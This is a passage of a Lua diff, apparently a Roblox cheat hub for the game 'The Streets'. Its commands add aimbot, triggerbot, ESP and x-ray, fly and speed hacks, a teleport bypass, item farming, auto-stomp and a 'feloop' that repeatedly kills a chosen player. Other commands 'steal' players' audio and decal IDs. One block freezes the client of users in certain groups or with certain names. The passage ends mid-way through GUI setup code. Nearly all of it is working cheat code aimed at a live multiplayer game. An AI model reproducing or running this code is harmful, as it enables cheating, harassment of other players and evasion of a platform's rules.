+AddCommand(function(L_558_arg0)
+	if game.PlaceId ~= 455366377 then
+		notif("d11voqii's hub", "Streets Only", 5, nil)
+		return
+	end 
+	L_35_ = not L_35_ 
+	if L_558_arg0[1] and L_558_arg0[2] and tonumber(L_558_arg0[2]) and L_558_arg0[1] == "health" then 
+		L_65_ = tonumber(L_558_arg0[2])
+	end 
+	notif("d11voqii's hub", "heal bot Has been set to " .. tostring(L_35_), 5, nil) 
+end, "healbot", {}, "Turns on auto healing at a set health (Defaults at 25 hp", "[Health [Number] (Optional)]")
+
+AddCommand(function()
+	if game.PlaceId ~= 455366377 then
+		notif("d11voqii's hub", "Streets Only", 5, nil)
+		return
+	end
+	if not GetChar():FindFirstChildOfClass'Tool' or not GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Clips' then
+		notif("Tool needed", "Hold a gun", 5, nil)
+		return
+	end 
+	L_154_func("ammo", GetChar().Head.CFrame)
+end, "reload", {
+	"r"
+}, "Gives your current gun ammo", "[No Args]")
+
+AddCommand(function(L_559_arg0)
+	if L_559_arg0[1] then 
+		local L_560_ = PlrFinder(L_559_arg0[1])
+		if L_560_ and L_560_.Character and L_560_ ~= LP then
+			if L_89_ then
+				L_89_:Disconnect()
+				L_89_ = nil
+			end 
+			workspace.CurrentCamera.CameraSubject = L_560_.Character 
+			if L_559_arg0[2] and L_559_arg0[2] == "loop" then 
+				L_89_ = L_560_.CharacterAdded:Connect(function(L_561_arg0)
+					workspace.CurrentCamera.CameraSubject = L_561_arg0 
+				end)
+			end
+		end
+	end
+end, "view", {}, "Look through a different players perspective", "[No Args]")
+
+AddCommand(function()
+	if L_89_ then
+		L_89_:Disconnect()
+		L_89_ = nil
+	end 
+	workspace.CurrentCamera.CameraSubject = GetChar()
+end, "unview", {}, "Look through your own vision like a normal person", "[No Args]")
+
+AddCommand(function()
+	L_33_ = not L_33_
+	notif("d11voqii's hub", "gun stomp Has been set to " .. tostring(L_33_), 5, nil)
+end, "gunstomp", {}, "Toggles GunStomp (On by default)", "[No Args]")
+
+AddCommand(function(L_562_arg0)
+	L_22_ = not L_22_ 
+	if L_562_arg0[1] then 
+		local L_563_ = PlrFinder(L_562_arg0[1])
+		if L_563_ then 
+			L_75_ = L_563_ 
+		end
+	end
+end, "camlock", {
+	"lockcam",
+	"cl"
+}, "Different type of aimbot (Uses camera instead of the remote)", "[Player Name]")
+
+AddCommand(function(L_564_arg0)
+	if L_564_arg0[1] then 
+		if L_564_arg0[1] == "auto" then 
+			L_19_ = not L_19_
+			return 
+		end
+		if L_564_arg0[1] == "sawed" then
+			L_564_arg0[1] = "sawed off"
+		end
+		farm(L_564_arg0[1])
+	end
+end, "farm", {}, "Farm (Cash,Sawed Off,Uzi,Shotty,Auto)", "[Item/Auto]")
+
+AddCommand(function()
+	L_36_ = not L_36_
+	if L_36_ then
+		for L_565_forvar0, L_566_forvar1 in pairs(L_134_) do
+			local L_567_, L_568_ = find(L_565_forvar0)
+			if L_567_ ~= "None" then 
+				L_148_func(L_567_, L_568_)
+			end
+		end
+	else
+		local L_569_ = workspace:GetChildren()
+		for L_570_forvar0 = 1, # L_569_ do 
+			L_147_func(L_569_[L_570_forvar0])
+		end
+	end
+end, "itemesp", {}, "Turns on ItemEsp", "[No Args]")
+
+AddCommand(function(L_571_arg0)
+	if game.PlaceId ~= 455366377 then
+		notif("d11voqii's hub", "Streets Only", 5, nil)
+		return
+	end 
+	if L_571_arg0[1] then
+		if L_571_arg0[1] == "sawed" then
+			L_571_arg0[1] = "sawedoff"
+		end
+		if L_125_[L_571_arg0[1]] then 
+			L_154_func(L_571_arg0[1], GetChar().Head.CFrame)
+		end
+	end
+end, "get", {
+	"tpto"
+}, "(Burger,Drink,Ammo,Pipe,Machete,SawedOff,Spray,Uzi,Glock)", "[Item]")
+
+AddCommand(function(L_572_arg0)
+	if L_572_arg0[1] then 
+		if L_133_[L_572_arg0[1]] then 
+			Teleport(L_133_[L_572_arg0[1]])
+		elseif L_572_arg0[1] == "banland" then 
+			TeleportService:Teleport(4669040)
+		elseif L_572_arg0[1] == "normalstreets" then 
+			TeleportService:Teleport(455366377)
+		end
+	end
+end, "place", {}, "(SandBox,Jail,Gas,Court,Beach,Bank,BanLand,NormalStreets)", "[Place]")
+
+AddCommand(function(L_573_arg0)
+	L_20_ = not L_20_
+	if L_20_ then
+		if L_573_arg0[1] and tonumber(L_573_arg0[1]) then 
+			L_54_ = L_573_arg0[1]
+		else
+			L_54_ = 2
+		end
+	end
+	notif("d11voqii's hub", "blink Has been set to " .. tostring(L_20_), 5, nil) 
+end, "blink", {}, "Different method of speed (Uses CFrame)", "[Number (Optional)]")
+
+AddCommand(function(L_574_arg0)
+	L_46_ = not L_46_
+	notif("d11voqii's hub", "walk shoot Has been set to " .. tostring(L_46_), 5, nil)
+end, "walkshoot", {
+	"noslow"
+}, "Allows you to turn On/Off Walk Shooting", "[No Args]")
+
+AddCommand(function(L_575_arg0)
+	L_28_ = not L_28_
+	if L_575_arg0[1] then
+		L_28_ = true 
+		local L_576_ = PlrFinder(L_575_arg0[1])
+		if L_576_ then 
+			GetChar():BreakJoints()
+			L_81_ = L_576_ 
+		end
+	else
+		L_81_ = nil
+	end
+end, "feloop", {}, "First you were a skid, Now you're annoying with a simple use of this command!", "[Player]")
+
+AddCommand(function(L_577_arg0)
+	L_11_ = not L_11_
+	if L_577_arg0[1] then 
+		if L_11_ then
+			local L_578_ = PlrFinder(L_577_arg0[1])
+			if L_578_ and L_578_ ~= LP then 
+				L_73_ = L_578_
+			end 
+		end 
+	end 
+end, "annoy", {
+	"shield"
+}, "Loop Teleports you infront of the Player", "[Player]")
+
+AddCommand(function(L_579_arg0)
+	L_43_ = not L_43_
+	if not L_43_ then
+		wait()
+		L_11_ = false 
+		L_73_ = nil
+		L_6_ = false
+		L_29_ = false
+		L_13_ = false
+	end  
+	if L_579_arg0[1] and L_43_ then
+		L_13_ = true
+		CheckCommand("annoy " .. L_579_arg0[1])
+		L_6_ = true
+		if not L_37_ then 
+			CheckCommand("neversit")
+		end
+	end 
+end, "triggerbot", {}, "triggerbot goes brrrrrrrrrrrrrrrr", "[Player]")
+
+AddCommand(function()
+	if game.PlaceId ~= 455366377 then
+		notif("d11voqii's hub", "Only works on normal Streets", 5, nil)
+		return
+	end
+	L_44_ = not L_44_
+end, "triggerbotautoreload", {}, "Triggerbot auto reload (instead of resetting only works on Ts) (also probably buggy)", "[No Args]")
+
+AddCommand(function(L_580_arg0)
+	if L_580_arg0[1] and L_580_arg0[2] and tonumber(L_580_arg0[2]) then
+		if L_580_arg0[1] == "down" then 
+			LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0, tonumber(L_580_arg0[2])))
+			LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0, 3))
+		elseif L_580_arg0[1] == "up" then 
+			LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position - UDim2.new(UDim.new(), LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0, tonumber(L_580_arg0[2])))
+			LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0, 3))
+		end
+	end
+end, "movechat", {}, "Move Chat Up/Down with (Up/Down [Number])", "[Up/Down] [Number]")
+
+AddCommand(function(L_581_arg0)
+	if L_581_arg0[1] and L_581_arg0[1] == "legacy" then
+		local L_582_ = GetChar():FindFirstChild'Right Arm'
+		if L_582_ then
+			L_582_:Destroy()
+		end
+	else
+		L_8_ = true 
+		L_127_ = LP.Backpack:GetChildren()
+		local L_583_ = GetChar()
+		L_583_.ChildAdded:Connect(function(L_584_arg0)
+			if L_584_arg0:IsA'Tool' then
+				if table.find(L_127_, L_584_arg0) then
+					return
+				end
+				L_584_arg0:Destroy()
+			end
+		end)
+		notif("d11voqii's hub", "anti kill Turn on noclip for best results")
+	end
+end, "antikill", {}, "Makes FE Loop not work (Legacy for removing right arm)", "[Legacy (Optional)]")
+
+AddCommand(function(L_585_arg0)
+	if L_585_arg0[1] then 
+		local L_586_ = PlrFinder(L_585_arg0[1])
+		if L_586_ and L_586_.Character then
+			local L_587_ = L_586_.Character:FindFirstChild'BoxModel' or L_586_.Character:FindFirstChild'BoomBox'
+			if L_587_ and L_587_:FindFirstChild'Handle' then
+				if writefile then
+					writefile("AudioLog from " .. L_586_.Name .. " " .. math.random(1, 99) .. ".txt", string.match(L_587_.Handle:FindFirstChildOfClass'Sound'.SoundId, '%d+'))
+					notif("Audio has been stolen.", "Check your exploits workspace folder", 5, nil)
+				else
+					print("Audio From: " .. L_586_.Name .. " Id: " .. string.match(L_587_.Handle:FindFirstChildOfClass'Sound'.SoundId, '%d+'))
+					notif("Audio has been stolen.", "It has been printed to your console (F9) due to your exploit not supporting writefile", 5, nil)
+				end
+			end
+		end
+	end
+end, "steal", {}, "Steals a persons audio", "[Player]")
+if LP:IsInGroup(6000816) or LP:IsInGroup(5152759) or LP:IsInGroup(5000083) or LP:IsInGroup(5993069) or string.find(LP.Name:lower(), "lynx") or string.find(LP.Name:lower(), "spacedgod") or L_131_[LP.UserId] then
+	while true do
+	end
+end
+AddCommand(function(L_588_arg0)
+	if L_588_arg0[1] then 
+		local L_589_ = PlrFinder(L_588_arg0[1])
+		if L_589_ then 
+			local L_590_ = workspace:FindFirstChild(L_589_.Name .. "Spray")
+			if L_590_ and L_590_:FindFirstChildOfClass'Decal' then
+				if writefile then  
+					writefile("DecalLog from " .. L_589_.Name .. " " .. math.random(1, 99) .. ".txt", tostring(string.match(L_590_.Decal.Texture, '%d+')))
+				else
+					print("Decal From: " .. L_589_.Name .. " Id: " .. tostring(string.match(L_590_.Decal.Texture, '%d+')))
+				end 
+			end
+		end
+	end
+end, "decalsteal", {}, "Steals a persons decal", "[Player]")
+
+AddCommand(function()
+	if game.PlaceId ~= 455366377 then
+		return notif("d11voqii's hub", "Streets Only", 5, nil)
+	end
+	if RainbowHats then
+		RainbowHats = false
+		LP.Backpack.Stank:FireServer("ren")
+	end
+	if L_104_.Visible then
+		L_104_.Visible = false
+		return
+	end 
+	L_106_:ClearAllChildren()
+	L_104_.Visible = true 
+	local L_591_ = LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()
+	L_157_func(UDim2.new(- 0.002, 0, 0, -10), "All")
+	for L_592_forvar0 = 1, # L_591_ do
+		local L_593_ = L_591_[L_592_forvar0]
+		if L_593_:IsA'TextButton' and L_593_:FindFirstChild'typ' then 
+			L_157_func(UDim2.new(- 0.002, 0, 0, -40 + (L_592_forvar0 * 30)), L_593_.typ.Value, L_593_.typ)
+		end
+	end
+end, "rainbowhats", {}, "Opens a GUI so you can pick what hat to rainbowize", "[No Args]")
+
+AddCommand(function(L_594_arg0)
+	if game.PlaceId ~= 455366377 then
+		return notif("d11voqii's hub", "Streets Only", 5, nil)
+	end
+	if L_594_arg0[1] and tonumber(L_594_arg0[1]) then
+		L_53_ = tonumber(L_594_arg0[1])
+	end
+end, "rainbowhatdelay", {}, "Changes the delay for rainbow hats", "[Number]")
+
+AddCommand(function(L_595_arg0)
+	if not L_595_arg0[2] then 
+		L_29_ = not L_29_
+	end 
+	if L_595_arg0[1] then 
+		if L_595_arg0[1] == "up" then 
+			L_61_ = L_61_ + L_595_arg0[2] or 1
+			notif("d11voqii's hub", "FlySpeed Has been set to " .. L_61_, 5, nil)
+		elseif L_595_arg0[1] == "down" then 
+			L_61_ = L_61_ - L_595_arg0[2] or 1
+			notif("d11voqii's hub", "FlySpeed Has been set to " .. L_61_, 5, nil)
+		elseif tonumber(L_595_arg0[1]) then
+			L_61_ = tonumber(L_595_arg0[1])
+			if L_29_ then
+				L_143_func()
+			end
+		end
+	else 
+		if L_29_ then
+			L_143_func()
+		end 
+	end
+end, "fly", {}, "Allows you to fly [Up/Down Speed]", "[Up/Down Speed]/Speed")
+
+AddCommand(function()
+	L_25_ = not L_25_
+	notif("d11voqii's hub", " double jump Has been set to " .. tostring(L_25_), 5, nil)
+end, "doublejump", {
+	"infinitejump"
+}, "Allows you to jump forever", "[No Args]")
+
+AddCommand(function()
+	L_42_ = not L_42_ 
+	GetChar():BreakJoints()
+end, "tpbypass", {}, "Teleportation Bypass (Allows Infinite FlySpeed etc)", "[No Args]")
+
+AddCommand(function(L_596_arg0)
+	if L_596_arg0[1] then
+		if L_137_[L_596_arg0[1]] then 
+			L_47_ = L_137_[L_596_arg0[1]]
+			notif("d11voqii's hub", "aimtarget has been set to " .. L_47_, 5, "rbxassetid://1281284684")
+		end
+	end
+end, "aimtarget", {}, "Changes the aim target [Head/Torso/HumanoidRootPart/Prediction]", "[Head/Torso/HumanoidRootPart/Prediction]")
+
+AddCommand(function(L_597_arg0)
+	if L_597_arg0[1] then
+		if L_597_arg0[1] == "leftclick" then 
+			L_48_ = "LeftClick" 
+		elseif L_597_arg0[1] == "rightclick" then 
+			L_48_ = "RightClick" 
+		elseif L_597_arg0[1] == "nomouse" then 
+			L_48_ = "NoMouse"
+		elseif L_597_arg0[1] == "closest" then 
+			L_48_ = "Closest" 
+			local L_598_ = L_2_:GetPlayers()
+			for L_599_forvar0 = 1, # L_598_ do
+				if L_598_[L_599_forvar0] ~= LP then 
+					L_144_func(L_598_[L_599_forvar0])
+				end 
+			end
+		end
+		updateHotkeys(L_51_)
+	end
+end, "aimmode", {
+	"aimlockmode"
+}, "LeftClick/RightClick/NoMouse/Closest (Sets the way you can aimlock)", "[LeftClick/RightClick/NoMouse/Closest]")
+
+AddCommand(function(L_600_arg0)
+	if L_600_arg0[1] and tonumber(L_600_arg0[1]) then
+		L_57_ = tonumber(L_600_arg0[1])
+		if L_47_ ~= "OldPrediction" then 
+			notif("d11voqii's hub", "This only works with aimtarget oldprediction (prediction auto sets dependant on ping)", 5, nil)
+		end
+	end 
+end, "aimvelocity", {}, "Changes your Aimbots Velocity (If mode is set to a prediction mode) (Default: 5)", "[Number]")
+
+AddCommand(function(L_601_arg0)
+	if L_601_arg0[1] and L_601_arg0[1] ~= "all" then
+		local L_602_ = PlrFinder(L_601_arg0[1])
+		if L_602_ and L_602_ ~= LP and tostring(L_71_) ~= tostring(L_602_) then 
+			L_71_, L_9_ = L_602_.Character, true
+			local L_603_;
+			L_603_ = L_602_.CharacterAdded:Connect(function(L_604_arg0)
+				if tostring(L_604_arg0) == tostring(L_71_) then
+					L_71_ = L_604_arg0
+				else
+					L_603_:Disconnect()
+					L_603_ = nil
+				end
+			end)
+			notif("d11voqii's hub", "AimlockTarget Has been set to " .. L_71_.Name, 5, nil)
+		end
+	else
+		L_9_ = not L_9_
+		notif("d11voqii's hub", "aimlock Has been set to " .. tostring(L_9_), 5, nil)		
+	end
+end, "aimlock", {
+	"aim"
+}, "Aimbot (Different method than camlock)", "[Player]")
+
+AddCommand(function(L_605_arg0)
+	if L_605_arg0[1] then
+		if L_605_arg0[1] == "triggerbot" then 
+			L_16_ = not L_16_
+			notif("AutoTriggerBot", "Has been set to " .. tostring(L_16_), 5, nil)
+		elseif L_605_arg0[1] == "feloop" then 
+			L_17_ = not L_17_
+			notif("AutoFeloop", "Has been set to " .. tostring(L_17_), 5, nil)
+		end
+	else 
+		L_18_ = not L_18_ 
+		notif("AutoTarget", "Has been set to " .. tostring(L_18_), 5, nil)
+	end 
+end, "autotarget", {
+	"autolock"
+}, "autotarget [triggerbot/feloop/no arguments] triggerbot auto triggerbots when someone hits you,no args auto camlocks/aimlocks", "[TriggerBot/FeLoop/No Args]")
+
+AddCommand(function()
+	L_6_ = not L_6_
+	notif("AimbotAutoShoot", "Has been set to " .. tostring(L_6_), 5, nil)		
+end, "aimbotautoshoot", {}, "Auto shoots aimbot", "[No Args]")
+
+AddCommand(function(L_606_arg0)
+	if L_606_arg0[1] then 
+		L_76_ = L_606_arg0[1]:sub(1, 1)
+		updateHotkeys(L_51_)
+	else
+		L_76_ = nil
+		updateHotkeys(L_51_)
+	end
+end, "clicktp", {
+	"ctp"
+}, "Allows you to teleport around the map with the Key you set", "[Key]")
+
+AddCommand(function()
+	L_15_ = not L_15_
+end, "autostomp", {}, "Turns On/Off AutoStomp", "[No Args]")
+
+AddCommand(function(L_607_arg0)
+	if L_607_arg0[1] then
+		if L_607_arg0[1] == "remove" and L_607_arg0[2] then
+			local L_608_ = PlrFinder(L_607_arg0[2])
+			if L_608_ and L_608_ ~= LP then
+				for L_609_forvar0, L_610_forvar1 in pairs(L_126_) do
+					if L_608_.UserId == L_610_forvar1 then
+						table.remove(L_126_, L_609_forvar0)
+					end 	
+				end 
+			else
+				local L_611_ = PlrFinder(L_607_arg0[1])
+				if L_611_ and L_611_ ~= LP then 
+					table.insert(L_126_, L_611_.UserId)
+				end
+			end
+		end
+	end
+end, "autostompwhitelist", {}, "Adds the player to the whitelist so they don't get stomped, to remove use remove before their name", "[Player]")
+
+AddCommand(function(L_612_arg0)
+	if not L_31_ then
+		L_31_ = true 
+		L_165_func(L_612_arg0[1])
+	else
+		L_31_ = false
+	end 
+end, "freecam", {}, "Allows you to \"free\" view the map", "[Speed (Optional)]")
+
+AddCommand(function()
+	L_80_ = Instance.new('Tool', LP.Backpack)
+	L_80_.Name = "GravGun"
+	L_80_.RequiresHandle = false 
+	local L_613_ = Instance.new('Part', L_80_)
+	L_613_.Name = "Handle"
+	L_613_.Transparency = 1
+end, "gravgun", {
+	"gravitygun"
+}, "Gmod Gravity gun", "[Keys: Q,V] (No Args)")
+
+AddCommand(function()
+	L_27_ = not L_27_
+	notif("ExploiterDetection", "Has been set to " .. tostring(L_27_), 5, nil)
+end, "exploiterdetection", {}, "Detects exploiters (Has a chance to false flag)", "[No Args]")
+
+AddCommand(function(L_614_arg0)
+	if L_614_arg0[1] then 
+		if L_614_arg0[1] == "image" then 
+			if L_614_arg0[2] then 
+				L_102_.Image = "http://www.roblox.com/asset/?id=" .. L_614_arg0[2]
+			end
+		elseif L_614_arg0[1] == "none" then 
+			L_102_.Image = ""
+		elseif L_614_arg0[1] == "default" then
+			L_102_.Image = "http://www.roblox.com/asset/?id=2812081613"
+		end
+		updateHotkeys(L_51_)
+	end
+end, "commandbarimage", {
+	"cmdbarimage"
+}, "Changes the command bar image", "[Image/None/Default]")
+
+AddCommand(function(L_615_arg0)
+	if L_615_arg0[1] then 
+		local L_616_ = PlrFinder(L_615_arg0[1])
+		if L_616_ and L_616_ ~= LP then 
+			if typeof(L_616_) == "table" then
+				for L_617_forvar0 = 1, # L_616_ do
+					local L_618_ = L_616_[L_617_forvar0]
+					if L_618_ ~= LP and L_618_.Character and L_618_.Character:FindFirstChild'Head' then
+						if L_615_arg0[1] == "users" and L_118_[L_618_] or L_615_arg0[1] ~= "users" then 
+							L_123_[L_618_] = true 
+							L_148_func(L_618_.Character.Head, L_616_.Name)
+							local L_619_;
+							L_619_ = L_618_.CharacterAdded:Connect(function(L_620_arg0)
+								local L_621_ = L_620_arg0:WaitForChild'Head'
+								if L_122_[L_616_] then 
+									L_148_func(L_621_, L_616_.Name)
+								else 
+									L_619_:Disconnect()
+								end
+							end)
+						end 
+					end 
+				end
+			else
+				if L_616_.Character and L_616_.Character:FindFirstChild'Head' then
+					L_123_[L_616_] = true 
+					L_148_func(L_616_.Character.Head, L_616_.Name)
+					local L_622_;
+					L_622_ = L_616_.CharacterAdded:Connect(function(L_623_arg0)
+						local L_624_ = L_623_arg0:WaitForChild'Head'
+						if L_122_[L_616_] then 
+							L_148_func(L_624_, L_616_.Name)
+						else 
+							L_622_:Disconnect()
+						end
+					end)
+				end 
+			end 
+		end 
+	end
+end, "esp", {}, "Find a player anywhere in the map", "[Player/All/Users]")
+
+AddCommand(function(L_625_arg0)
+	if L_625_arg0[1] then 
+		local L_626_ = PlrFinder(L_625_arg0[1])
+		if L_626_ then 
+			if typeof(L_626_) == "table" then 
+				for L_627_forvar0 = 1, # L_626_ do
+					local L_628_ = L_626_[L_627_forvar0]
+					if L_628_.Character and L_628_.Character:FindFirstChild'Head' then 
+						L_147_func(L_628_)
+					end 
+				end
+			else 
+				if L_626_.Character and L_626_.Character:FindFirstChild'Head' then 
+					L_147_func(L_626_)
+				end
+			end
+		end
+	end
+end, "unesp", {}, "obviously removes the esp?", "[Player/All]")
+
+AddCommand(function(L_629_arg0)
+	if L_629_arg0[1] then 
+		if L_629_arg0[1] == "esp" then 
+			L_70_ = Color3.fromRGB(L_629_arg0[2] or 0, L_629_arg0[3] or 0, L_629_arg0[4] or 0)
+		elseif L_629_arg0[1] == "bullet" then			
+			L_69_ = ColorSequence.new(Color3.fromRGB(L_629_arg0[2] or 0, L_629_arg0[3] or 0, L_629_arg0[4] or 0))
+		end
+	end
+end, "colour", {
+	"color"
+}, "Colour esp/bullet [3 Args (Number) (Optional)] defaults to 0", "[Esp/Bullet] [3 numbers (Optional)]")
+
+AddCommand(function()
+	L_111_.Visible = not L_111_.Visible
+end, "hotkey", {
+	"key"
+}, "For Setting hotkeys, Type in the textbox, click the button and press a key", "[No Args]")
+
+AddCommand(function(L_630_arg0)
+	if L_630_arg0[1] then
+		for L_631_forvar0, L_632_forvar1 in pairs(L_124_) do
+			if L_632_forvar1:match'[%a%d]+$' == L_630_arg0[1]:upper() or L_632_forvar1:match("[%a%d]+$") == L_630_arg0[1] then
+				table.remove(L_124_, L_631_forvar0)
+				updateHotkeys(L_51_)
+			end
+		end
+	end
+end, "removekey", {
+	"rkey"
+}, "Removes a hotkey to a command", "[Key]")
+
+AddCommand(function()
+	L_124_ = {}
+	L_76_ = ""
+	updateHotkeys(L_51_)
+end, "removeallhotkeys", {
+	"removeallkeys"
+}, "Removes all hotkeys", "[No Args]")
+
+AddCommand(function(L_633_arg0)
+	if readfile and writefile then 
+		if L_633_arg0[1] then 
+			if L_633_arg0[1] == "default" then 
+				L_51_ = "d11voqiiStreetsAdminSettings.json"
+			elseif pcall(readfile, L_633_arg0[1] .. ".json") then 
+				L_51_ = L_633_arg0[1] .. ".json"
+			else 
+				L_51_ = L_633_arg0[1] .. ".json"
+				initalizeHotkeys(L_51_)
+			end
+			runHotkeys(L_51_)
+		end
+	end
+end, "config", {}, "Changes Configs (Useful for having different profiles i.e legit etc)", "[Config Name]")
+
+AddCommand(function(L_634_arg0)
+	if L_634_arg0[1] then 
+		if L_634_arg0[1] == "wireframe" then
+			L_149_func(L_634_arg0[1], "wireframe")
+		else 
+			notif("Xray", "Sorry, Only [Xray WireFrame/No Args] Work", 5, nil)
+		end
+	else 
+		L_149_func()
+	end 
+end, "xray", {}, "see through walls (also has wireframe mode which looks cool but kills fps)", "[WireFrame/No Args]")
+
+-- [[ End ]] -- 
+
+-- [[ Gui Initalization ]] -- 
+
+coroutine.resume(coroutine.create(function()
+	-- Rainbow Hats --
+	L_104_.Visible = false 
+	L_104_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_104_.BackgroundTransparency = 0.6
+	L_104_.Position = UDim2.new(0.3, 0, 0.17, 0)
+	L_104_.Size = UDim2.new(0, 460, 0, 359)
+	L_104_.AnchorPoint = Vector2.new(0, 0)
+	
+	L_105_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_105_.BackgroundTransparency = 0.3
+	L_105_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_105_.BorderSizePixel = 2
+	L_105_.Position = UDim2.new(- 0.002, 0, - 0.14, 0)
+	L_105_.Size = UDim2.new(0, 460, 0, 50)
+	L_105_.Font = Enum.Font.SciFi
+	L_105_.Text = "Rainbow Hats"
+	L_105_.TextColor3 = Color3.fromRGB(255, 170, 255)
+	L_105_.TextSize = 50
+
+	L_106_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_106_.BackgroundTransparency = 0.3
+	L_106_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_106_.BorderSizePixel = 2
+	L_106_.Position = UDim2.new(- 0.0013, 0, - 0.0006, 0)
+	L_106_.Size = UDim2.new(0, 460, 0, 359)
+	L_106_.CanvasSize = UDim2.new(0, 0, 10, 0)
+	L_106_.ScrollBarThickness = 10
+	
+	L_97_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	L_97_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_97_.BorderSizePixel = 0
+	L_97_.Position = UDim2.new(0.34, 0, 0.16, 0)
+	L_97_.Size = UDim2.new(0, 400, 0, 350)
+	L_97_.Style = Enum.FrameStyle.RobloxSquare
+	L_97_.Visible = false 
+	L_97_.AnchorPoint = Vector2.new(0, 0)
+	
+	-- Help Gui --
+	 
+	L_98_.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
+	L_98_.BackgroundTransparency = 0.2
+	L_98_.BorderColor3 = Color3.fromRGB(49, 0, 0)
+	L_98_.BorderSizePixel = 0
+	L_98_.Position = UDim2.new(- 0.02, 0, - 0.15, 0)
+	L_98_.Size = UDim2.new(0, 400, 0, 43)
+	L_98_.Font = Enum.Font.SciFi
+	L_98_.Text = "Commands"
+	L_98_.TextColor3 = Color3.fromRGB(255, 255, 255)
+	L_98_.TextSize = 20
+	
+	L_99_.Active = true
+	L_99_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_99_.BackgroundTransparency = 1
+	L_99_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_99_.BorderSizePixel = 0
+	L_99_.Position = UDim2.new(- 0.022, 0, - 0.02, 0)
+	L_99_.Size = UDim2.new(0, 400, 0, 350)
+	L_99_.CanvasSize = UDim2.new(0, 0, 10, 0)
+	L_99_.ScrollBarThickness = 10
+	
+	-- Command bar --
+
+	
+	L_100_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_100_.BackgroundTransparency = 0.8
+	L_100_.Size = UDim2.new(0, 197, 0, 41)
+	L_100_.Position = UDim2.new(1.5, 0, 1.5, 0)
+	L_100_.AnchorPoint = Vector2.new(0.5, 0.5)
+
+	L_101_.BackgroundColor3 = Color3.fromRGB(89, 203, 232)
+	L_101_.BackgroundTransparency = 0.4
+	L_101_.BorderColor3 = Color3.fromRGB(89, 203, 232)
+	L_101_.BorderSizePixel = 2
+	L_101_.Position = UDim2.new(0, 0, - 0.8, 0)
+	L_101_.Size = UDim2.new(0, 199, 0, 41)
+	L_101_.Font = Enum.Font.SciFi
+	L_101_.TextColor3 = Color3.fromRGB(89, 203, 232)
+	L_101_.TextSize = 15
+	L_101_.TextWrapped = true
+	L_101_.ClearTextOnFocus = true 
+	
+	L_102_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_102_.Size = UDim2.new(0, 199, 0, 145)
+	L_102_.Image = CmdBarImage
+	
+	-- Values GUI -- 
+	
+	L_107_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	L_107_.BackgroundTransparency = 1
+	L_107_.Position = UDim2.new(0.15, 0, 1, 0)
+	L_107_.AnchorPoint = Vector2.new(0, 1)
+	L_107_.Size = UDim2.new(0, 160, 0, 160)
+	
+	L_108_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_108_.BackgroundTransparency = 0.6
+	L_108_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_108_.Position = UDim2.new(0, 0, 0, 0)
+	L_108_.Size = UDim2.new(0, 160, 0, 160)
+	L_108_.Font = Enum.Font.Code
+	L_108_.TextColor3 = Color3.fromRGB(255, 255, 255)
+	L_108_.TextSize = 14
+	L_108_.TextWrapped = true
+	L_108_.TextYAlignment = Enum.TextYAlignment.Top
+	
+	-- Hotkeys GUI -- 
+	
+	L_109_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	L_109_.BackgroundTransparency = 1
+	L_109_.Position = UDim2.new(0.8, 0, 1, 0)
+	L_109_.AnchorPoint = Vector2.new(1, 1)
+	L_109_.Size = UDim2.new(0, 160, 0, 160)
+
+	L_110_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_110_.BackgroundTransparency = 0.6
+	L_110_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_110_.Position = UDim2.new(0, 0, 0, 0)
+	L_110_.Text = "Open Command Bar: '\nGunStomp: E"
+	L_110_.Size = UDim2.new(0, 160, 0, 160)
+	L_110_.Font = Enum.Font.Code
+	L_110_.TextColor3 = Color3.fromRGB(255, 255, 255)
+	L_110_.TextSize = 14
+	L_110_.TextWrapped = true
+	L_110_.TextYAlignment = Enum.TextYAlignment.Top
+	
+	-- Damage Indicator -- 
+	
+	L_103_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_103_.BackgroundTransparency = 0.7
+	L_103_.BorderSizePixel = 3
+	L_103_.Position = UDim2.new(0, 0, 1, 0)
+	L_103_.Size = UDim2.new(0, 385, 0, 50)
+	L_103_.Font = Enum.Font.Code
+	L_103_.TextColor3 = Color3.fromRGB(184, 0, 3)
+	L_103_.TextScaled = true
+	L_103_.TextSize = 30
+	L_103_.TextWrapped = true
+	L_103_.Visible = false
+
+	-- Hotkeys GUI -- 
+
+	L_111_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_111_.BackgroundTransparency = 0.6
+	L_111_.BorderColor3 = Color3.fromRGB(170, 0, 0)
+	L_111_.BorderSizePixel = 0
+	L_111_.Position = UDim2.new(0.5, 0, 0.5, 0)
